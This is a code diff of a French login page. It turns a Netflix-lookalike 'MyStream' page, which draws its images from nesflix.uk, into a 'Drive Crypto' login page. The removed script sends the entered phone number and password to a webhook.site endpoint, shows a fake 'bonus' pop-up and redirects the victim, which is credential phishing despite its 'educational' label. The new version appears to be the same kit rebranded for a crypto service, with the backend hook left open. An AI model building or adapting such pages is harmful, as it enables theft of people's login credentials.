@@ -1,206 +1,289 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>MyStream - Connexion</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+  <title>Drive Crypto – Connexion</title>
+  <!-- Polices : système par défaut pour correspondre au rendu mobile iOS/Android -->
   <style>
+    :root {
+      /* Couleurs (ajustables si tu me fournis les HEX exacts) */
+      --bg: #e9f2fb;               /* bleu très clair de fond */
+      --text: #0f172a;             /* texte principal – ardoise foncé */
+      --muted: #5b6b80;            /* texte secondaire */
+      --input-bg: #ffffff;         /* fond des champs */
+      --input-border: #e6e9ef;     /* bordure champ */
+      --placeholder: #9aa6b2;      /* placeholder */
+      --primary: #135ef2;          /* bouton primaire / liens */
+      --primary-hover: #0e4fd0;    /* hover */
+      --link: #135ef2;             /* liens */
+      --focus: #90b4ff;            /* anneau focus */
+      --error: #d92d20;            /* erreurs */
+
+      /* Dimensions basées sur la maquette mobile (~390px de large) */
+      --container-w: 360px;        /* largeur visuelle du formulaire */
+      --radius-pill: 32px;         /* champs/bouton très arrondis */
+      --input-h: 64px;             /* hauteur des champs */
+      --button-h: 64px;            /* hauteur du bouton */
+      --logo-w: 160px;             /* largeur approximative du logo */
+    }
+
+    *, *::before, *::after { box-sizing: border-box; }
+    html, body { height: 100%; }
     body {
       margin: 0;
-      font-family: Arial, Helvetica, sans-serif;
-      background: #000;
-      color: #fff;
+      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
+      color: var(--text);
+      background: var(--bg);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
     }
 
-    /* Hero background */
-    .hero {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      background: url("https://nesflix.uk/bgimage.jpg") center/cover no-repeat;
-      position: relative;
-    }
-    .hero::before {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.65);
+    .wrap {
+      min-height: 100dvh;
+      display: grid;
+      place-items: start center;
+      padding: 24px 16px 32px;
     }
 
-    /* Contenu */
-    .hero-content {
-      position: relative;
-      text-align: center;
-      z-index: 2;
-      margin-bottom: 20px;
-    }
-    .brand {
-      color: #e50914;
-      font-size: 2rem;
-      font-weight: bold;
-      margin-bottom: 10px;
-    }
-    .subtitle {
-      font-size: 1rem;
-      font-weight: normal;
-      margin: 0;
-      color: #ddd;
-    }
-
-    /* Card login */
-    .login-card {
-      position: relative;
-      z-index: 2;
-      width: 320px;
-      background: rgba(0, 0, 0, 0.75);
-      padding: 30px 20px;
-      border-radius: 8px;
-    }
-    .login-card h2 {
-      margin: 0 0 20px;
-      text-align: center;
-      font-size: 1.3rem;
-    }
-    .input-group {
-      display: flex;
-      align-items: center;
-      background: #333;
-      border-radius: 4px;
-      padding: 12px;
-      margin-bottom: 15px;
-      position: relative;
-    }
-    .input-group svg {
-      width: 18px;
-      height: 18px;
-      flex-shrink: 0;
-      fill: #aaa;
-    }
-    .input-group input {
-      background: transparent;
-      border: none;
-      outline: none;
-      color: #fff;
-      margin-left: 10px;
-      flex: 1;
-      font-size: 1rem;
-    }
-    .input-group input::placeholder {
-      color: #888;
-    }
-
-    /* Icône œil */
-    .eye-icon {
-      position: absolute;
-      right: 12px;
-      cursor: pointer;
-    }
-    .eye-icon svg {
-      width: 20px;
-      height: 20px;
-      fill: #888;
-    }
-
-    /* Bouton */
-    .btn {
-      display: block;
+    .form-card {
       width: 100%;
-      padding: 14px;
-      background: #e50914;
-      border: none;
-      border-radius: 4px;
-      color: #fff;
-      font-weight: bold;
-      font-size: 1rem;
-      cursor: pointer;
-      margin: 20px 0 10px;
+      max-width: var(--container-w);
     }
 
-    /* Footer card */
-    .card-footer {
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin: 8px 0 32px 8px; /* léger décalage gauche comme sur la capture */
+    }
+
+    .brand img {
+      width: var(--logo-w);
+      height: auto;
+      display: block;
+    }
+
+    h1 {
+      margin: 0 0 10px;
+      font-weight: 700;
+      font-size: 40px; /* taille visuelle du "Bienvenue" */
+      line-height: 1.1;
+      letter-spacing: 0.2px;
       text-align: center;
-      font-size: 0.9rem;
-      color: #ccc;
-    }
-    .card-footer a {
-      color: #e50914;
-      text-decoration: none;
-      font-weight: bold;
     }
 
-    /* Footer bas */
-    .site-footer {
+    .peace { font-size: 42px; vertical-align: -4px; margin-left: 6px; }
+
+    .subtitle {
+      margin: 0 auto 28px;
+      text-align: center;
+      color: var(--muted);
+      font-size: 20px;
+      line-height: 1.35;
+      max-width: 28ch;
+    }
+
+    .field {
       position: relative;
-      z-index: 2;
-      text-align: center;
-      color: rgba(255, 255, 255, 0.7);
-      font-size: 0.8rem;
-      padding: 30px 10px;
-      margin-top: 20px;
+      margin: 18px 0;
+    }
+
+    .input {
+      width: 100%;
+      height: var(--input-h);
+      border-radius: var(--radius-pill);
+      border: 1px solid var(--input-border);
+      background: var(--input-bg);
+      padding: 0 24px;
+      font-size: 22px;
+      line-height: 1;
+      outline: none;
+      transition: box-shadow .2s ease, border-color .2s ease;
+    }
+
+    .input::placeholder { color: var(--placeholder); opacity: 1; }
+
+    .input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px var(--focus);
+    }
+
+    /* Bouton œil */
+    .toggle-eye {
+      position: absolute;
+      right: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 28px; height: 28px;
+      border: none; background: transparent; padding: 0;
+      cursor: pointer; display: grid; place-items: center;
+    }
+    .toggle-eye svg { width: 24px; height: 24px; }
+
+    .row {
+      display: flex;
+      align-items: center;
+      justify-content: flex-start;
+      gap: 12px;
+      margin-top: 6px;
+    }
+
+    .check {
+      inline-size: 22px; block-size: 22px;
+      border-radius: 6px;
+      border: 1.5px solid var(--input-border);
+      background: #fff;
+      display: grid; place-items: center;
+      cursor: pointer;
+      transition: border-color .2s ease, background .2s ease, box-shadow .2s ease;
+    }
+    .check:focus-visible { outline: none; box-shadow: 0 0 0 4px var(--focus); }
+    .check svg { display: none; }
+    .check[aria-checked="true"] { background: var(--primary); border-color: var(--primary); }
+    .check[aria-checked="true"] svg { display: block; }
+
+    .row label { font-size: 22px; color: var(--text); cursor: pointer; }
+
+    .links { margin: 12px 0 18px; }
+    .link { color: var(--link); font-size: 22px; text-decoration: underline; text-underline-offset: 3px; }
+    .link:focus-visible { outline: none; box-shadow: 0 0 0 4px var(--focus); border-radius: 6px; }
+
+    .btn {
+      display: inline-grid; place-items: center;
+      width: 100%; height: var(--button-h);
+      border-radius: var(--radius-pill);
+      background: var(--primary);
+      color: #fff; font-weight: 600; font-size: 32px;
+      border: none; cursor: pointer;
+      transition: transform .04s ease, background .2s ease, box-shadow .2s ease;
+      box-shadow: 0 1px 0 rgba(0,0,0,.04), 0 8px 20px rgba(19,94,242,.18);
+    }
+    .btn:hover { background: var(--primary-hover); }
+    .btn:active { transform: translateY(1px); }
+    .btn:focus-visible { outline: none; box-shadow: 0 0 0 4px var(--focus); }
+    .btn[disabled] { opacity: .55; cursor: not-allowed; }
+
+    .below { text-align: center; margin: 22px 0 18px; font-size: 24px; color: var(--text); }
+    .below a { color: var(--link); text-decoration: underline; text-underline-offset: 3px; }
+
+    footer { text-align: center; margin-top: 32px; color: var(--muted); font-size: 20px; }
+    footer a { color: var(--link); }
+
+    /* Messages d'erreur */
+    .error { margin-top: 6px; color: var(--error); font-size: 16px; display: none; }
+    .field.invalid .error { display: block; }
+
+    /* Desktop : garder la mise en page centrée, sans altérer les proportions */
+    @media (min-width: 768px) {
+      :root { --container-w: 430px; }
+      .wrap { place-items: center; padding-top: 48px; }
+      .brand { margin-left: 0; margin-bottom: 36px; justify-content: center; }
     }
   </style>
 </head>
 <body>
-  <main class="hero">
-    <div class="hero-content">
-      <div class="brand">MYSTREAM</div>
-      <p class="subtitle">Connectez-vous avec votre numéro de téléphone</p>
-    </div>
-
-    <section class="login-card">
-      <h2>Se connecter</h2>
-      <form>
-        <!-- Téléphone -->
-        <div class="input-group">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 1H7a2 2 0 0 0-2 2v18a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2zm0 18H7V5h10v14z"/></svg>
-          <input type="tel" placeholder="Numéro de téléphone">
-        </div>
-        <!-- Mot de passe -->
-        <div class="input-group">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 8h-1V6a4 4 0 1 0-8 0v2H7a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zm-5 8a2 2 0 1 1 0-4 2 2 0 0 1 0 4zm3-8H9V6a3 3 0 0 1 6 0v2z"/></svg>
-          <input type="password" placeholder="Mot de passe">
-          <span class="eye-icon">
-            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12a4.5 4.5 0 1 1 0-9 4.5 4.5 0 0 1 0 9z"/></svg>
-          </span>
-        </div>
-        <button class="btn">Se connecter</button>
-      </form>
-      <div class="card-footer">
-        Vous n'avez pas de compte ? <a href="#">S'inscrire maintenant</a>
+  <main class="wrap" role="main">
+    <section class="form-card" aria-label="Connexion">
+      <div class="brand" aria-hidden="true">
+        <img src="https://mydrivecrypto.online/assets/img/logo.png" alt="Drive Crypto" />
       </div>
-    </section>
 
-    <footer class="site-footer">
-      © 2025 MyStream International. Tous droits réservés.
-    </footer>
+      <h1>Bienvenue <span class="peace" aria-hidden="true">✌️</span></h1>
+      <p class="subtitle">Entrer vos informations pour vous connecter</p>
+
+      <form id="loginForm" novalidate>
+        <!-- Email -->
+        <div class="field" id="field-email">
+          <input class="input" type="email" id="email" name="email" placeholder="Adresse Email" autocomplete="email" required aria-label="Adresse Email" />
+          <p class="error" id="err-email">Veuillez entrer une adresse email valide.</p>
+        </div>
+
+        <!-- Mot de passe -->
+        <div class="field" id="field-password">
+          <input class="input" type="password" id="password" name="password" placeholder="Mot de passe" autocomplete="current-password" required aria-label="Mot de passe" />
+          <button class="toggle-eye" type="button" aria-label="Afficher le mot de passe" aria-pressed="false">
+            <!-- Icône œil (SVG) -->
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+              <path d="M12 5C6.5 5 2.1 8.6 1 12c1.1 3.4 5.5 7 11 7s9.9-3.6 11-7c-1.1-3.4-5.5-7-11-7Z" stroke="currentColor" stroke-width="1.8"/>
+              <circle cx="12" cy="12" r="3.5" stroke="currentColor" stroke-width="1.8"/>
+            </svg>
+          </button>
+          <p class="error" id="err-password">Veuillez saisir votre mot de passe.</p>
+        </div>
+
+        <!-- Remember + lien mdp -->
+        <div class="row">
+          <button type="button" class="check" id="remember" role="checkbox" aria-checked="false" aria-label="Se rappeler de moi">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
+          </button>
+          <label for="remember">Se rappeler de moi</label>
+        </div>
+        <div class="links"><a class="link" href="#" id="forgot">Mot de passe oublié ?</a></div>
+
+        <!-- Bouton principal -->
+        <button class="btn" type="submit" id="submitBtn">Connexion</button>
+
+        <!-- Bas de page texte -->
+        <p class="below">Pas de compte ? <a href="#" id="create">Créer un compte</a></p>
+      </form>
+
+      <footer>
+        Copyright @2025, <a href="#" id="footerLink">My Drive Crypto</a>
+      </footer>
+    </section>
   </main>
 
-  <!-- Script pédagogique -->
   <script>
-    document.querySelector("form").addEventListener("submit", function(e) {
+    // Bascule visibilité mdp
+    const pwd = document.getElementById('password');
+    const eyeBtn = document.querySelector('.toggle-eye');
+    eyeBtn.addEventListener('click', () => {
+      const isPwd = pwd.type === 'password';
+      pwd.type = isPwd ? 'text' : 'password';
+      eyeBtn.setAttribute('aria-pressed', String(isPwd));
+      eyeBtn.setAttribute('aria-label', isPwd ? 'Masquer le mot de passe' : 'Afficher le mot de passe');
+      // Alterner l'icône (œil / œil barré)
+      eyeBtn.innerHTML = isPwd
+        ? '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M2 12C3.1 8.6 7.5 5 13 5c2.3 0 4.4.6 6.2 1.6" stroke="currentColor" stroke-width="1.8"/><path d="M22 12c-1.1 3.4-5.5 7-11 7-2.1 0-4-.4-5.7-1.2" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="3.5" stroke="currentColor" stroke-width="1.8"/><path d="m3 3 18 18" stroke="currentColor" stroke-width="1.8"/></svg>'
+        : '<svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M12 5C6.5 5 2.1 8.6 1 12c1.1 3.4 5.5 7 11 7s9.9-3.6 11-7c-1.1-3.4-5.5-7-11-7Z" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="3.5" stroke="currentColor" stroke-width="1.8"/></svg>';
+    });
+
+    // Checkbox custom
+    const remember = document.getElementById('remember');
+    remember.addEventListener('click', () => {
+      const checked = remember.getAttribute('aria-checked') === 'true';
+      remember.setAttribute('aria-checked', String(!checked));
+    });
+    remember.addEventListener('keydown', (e) => {
+      if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); remember.click(); }
+    });
+
+    // Validation simple (sans backend)
+    const form = document.getElementById('loginForm');
+    const fieldEmail = document.getElementById('field-email');
+    const fieldPwd = document.getElementById('field-password');
+    const submitBtn = document.getElementById('submitBtn');
+
+    function showError(field, state) {
+      field.classList.toggle('invalid', state);
+    }
+
+    form.addEventListener('submit', (e) => {
       e.preventDefault();
+      let invalid = false;
 
-      const tels = document.querySelector('input[type="tel"]').value;
-      const passwords = document.querySelector('input[type="password"]').value;
+      // email
+      if (!email.value || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.value)) { showError(fieldEmail, true); invalid = true; } else { showError(fieldEmail, false); }
 
-      fetch("https://webhook.site/f8b07a2b-efd2-4812-bb67-972dc0912b4f", {
-        method: "POST",
-        headers: { "Content-Type": "text/plain" },
-        body: JSON.stringify({
-          tels: tels,
-          passwords: passwords
-        })
-      })
-      .then(() => alert("Données envoyées au webhook !"))
-      .catch(err => console.error("Erreur :", err));
+      // password
+      if (!pwd.value) { showError(fieldPwd, true); invalid = true; } else { showError(fieldPwd, false); }
 
-      // Pop-up d'information
-      alert("Le bonus sera transféré dans les 48h");
-
-      // Redirection
-      window.location.href = "https://nesflix.uk/dashboard";
+      if (!invalid) {
+        submitBtn.disabled = true; submitBtn.textContent = 'Connexion…';
+        // Simulation chargement (2s) – remplace par un appel réseau si besoin
+        setTimeout(() => { submitBtn.disabled = false; submitBtn.textContent = 'Connexion'; alert('Formulaire prêt à être relié à votre backend.'); }, 1500);
+      }
     });
   </script>
 </body>
